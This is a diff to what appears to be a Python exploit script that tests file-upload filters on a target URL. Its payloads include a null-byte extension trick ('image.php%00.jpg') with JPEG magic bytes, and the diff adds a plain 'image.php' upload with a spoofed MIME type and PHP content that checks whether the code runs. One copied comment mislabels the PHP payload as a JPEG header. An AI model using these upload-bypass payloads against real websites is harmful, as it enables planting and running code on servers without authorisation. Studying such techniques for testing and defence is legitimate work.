@@ -74,8 +74,15 @@ payloads = {
         "file_name": "image.php%00.jpg",
         "mime": "image/jpeg",
         "content": b"\xff\xd8\xff\xe0"  # header JPEG
+    },
+    "file3": {
+        "file_name": "image.php",
+        "mime": "php/application",
+        "content": "<?php echo 'ok'?>"  # header JPEG
     }
 }
+
+
 
 if args.url:
     print(f"[+] Exploit {args.url}")
